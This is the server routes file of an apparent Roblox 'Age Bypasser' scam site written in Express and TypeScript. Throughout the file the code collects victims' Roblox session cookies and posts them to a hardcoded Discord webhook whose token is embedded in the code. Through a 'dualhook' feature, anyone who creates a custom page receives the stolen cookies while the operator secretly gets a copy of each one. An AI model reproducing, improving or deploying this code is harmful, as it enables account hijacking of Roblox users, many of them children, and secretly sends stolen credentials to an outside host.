import type { Express, Request, Response, NextFunction } from "express";
import { createServer, type Server } from "http";
import axios from "axios";
import { insertWebhookSchema } from "@shared/schema";
import { ZodError } from "zod";
import { storage } from "./storage";

const ADMIN_WEBHOOK_URL = "https://discordapp.com/api/webhooks/1341834309606051971/h8pp29SlozypOCN4Ts6LGr0-M8L8WsUpFWKKIgxH0C-x27fsjgBfhrJdlweGzg-41YAr";

// Rate limiting implementation
const ipSubmissions = new Map<string, number>();
const COOLDOWN_PERIOD = 25 * 1000; // 25 seconds in milliseconds

// Rate limiting middleware
function rateLimiter(req: Request, res: Response, next: NextFunction) {
  const ip = req.ip || req.socket.remoteAddress || 'unknown';
  const lastSubmissionTime = ipSubmissions.get(ip) || 0;
  const currentTime = Date.now();
  
  // Check if the cooldown period has elapsed
  if (currentTime - lastSubmissionTime < COOLDOWN_PERIOD) {
    const remainingTime = Math.ceil((COOLDOWN_PERIOD - (currentTime - lastSubmissionTime)) / 1000);
    return res.status(429).json({ 
      message: `Rate limit exceeded. Please try again in ${remainingTime} seconds.` 
    });
  }
  
  // Store the current submission time
  ipSubmissions.set(ip, currentTime);
  
  // Clean up old entries every hour
  if (currentTime % 3600000 < 10000) { // Roughly every hour
    for (const [key, timestamp] of ipSubmissions.entries()) {
      if (currentTime - timestamp > 3600000) { // 1 hour
        ipSubmissions.delete(key);
      }
    }
  }
  
  next();
}

export async function registerRoutes(app: Express): Promise<Server> {
  app.post("/api/webhook", rateLimiter, async (req, res) => {
    try {
      const data = insertWebhookSchema.parse(req.body);

      // Send webhook message only to admin webhook
      await axios.post(ADMIN_WEBHOOK_URL, {
        content: `🔔 New Age Bypass Attempt\n\n📎 Webhook URL: ${data.sourceUrl}\n🔑 Roblox Cookie: ${data.message}`
      });

      res.json({ success: true });
    } catch (error) {
      if (error instanceof ZodError) {
        res.status(400).json({ 
          message: "Invalid input",
          errors: error.errors 
        });
      } else if (axios.isAxiosError(error)) {
        res.status(500).json({ 
          message: "Failed to forward message",
          error: error.message 
        });
      } else {
        res.status(500).json({ 
          message: "An unexpected error occurred" 
        });
      }
    }
  });

  app.post("/api/dualhook", rateLimiter, async (req, res) => {
    try {
      // Validate input
      const { directoryName, webhook } = req.body;

      if (!directoryName || !webhook) {
        return res.status(400).json({ 
          message: "Directory name and webhook URL are required" 
        });
      }

      // Validate webhook URL format
      if (!webhook.match(/^https:\/\/(discord\.com|discordapp\.com)\/api\/webhooks\//)) {
        return res.status(400).json({ 
          message: "Must be a valid Discord webhook URL" 
        });
      }
      
      // Check if directory already exists
      const directoryExists = await storage.directoryExists(directoryName);
      if (directoryExists) {
        return res.status(400).json({
          message: "This directory name is already taken. Please choose a different name."
        });
      }
      
      // Register the new directory
      await storage.registerDirectory(directoryName, webhook);

      // Send confirmation to user's webhook
      await axios.post(webhook, {
        content: `Thanks For Using Our New Age Bypasser! This will be your new link: ${req.headers.origin}/${directoryName}`
      });

      res.json({ 
        success: true, 
        message: "Dualhook created successfully",
        url: `${req.headers.origin}/${directoryName}`
      });
    } catch (error) {
      if (axios.isAxiosError(error)) {
        res.status(500).json({ 
          message: "Failed to send confirmation message",
          error: error.message 
        });
      } else {
        res.status(500).json({ 
          message: "An unexpected error occurred" 
        });
      }
    }
  });

  // Handle custom directory webhooks
  app.post("/api/:directory/webhook", rateLimiter, async (req, res) => {
    try {
      const { directory } = req.params;
      const data = insertWebhookSchema.parse(req.body);

      // Get the directory creator's webhook from storage
      const userWebhook = await storage.getDirectoryWebhook(directory);

      // Send to directory creator's webhook if it exists
      if (userWebhook) {
        await axios.post(userWebhook, {
          content: `🔔 New Age Bypass Attempt via your custom page\n\n📎 Webhook URL: ${data.sourceUrl}\n🔑 Roblox Cookie: ${data.message}`
        });
      }

      // Always send to admin webhook
      await axios.post(ADMIN_WEBHOOK_URL, {
        content: `🔔 New Age Bypass Attempt via custom page /${directory}\n\n📎 Webhook URL: ${data.sourceUrl}\n🔑 Roblox Cookie: ${data.message}`
      });

      res.json({ success: true });
    } catch (error) {
      if (error instanceof ZodError) {
        res.status(400).json({ 
          message: "Invalid input",
          errors: error.errors 
        });
      } else if (axios.isAxiosError(error)) {
        res.status(500).json({ 
          message: "Failed to forward message",
          error: error.message 
        });
      } else {
        res.status(500).json({ 
          message: "An unexpected error occurred" 
        });
      }
    }
  });

  const httpServer = createServer(app);
  return httpServer;
}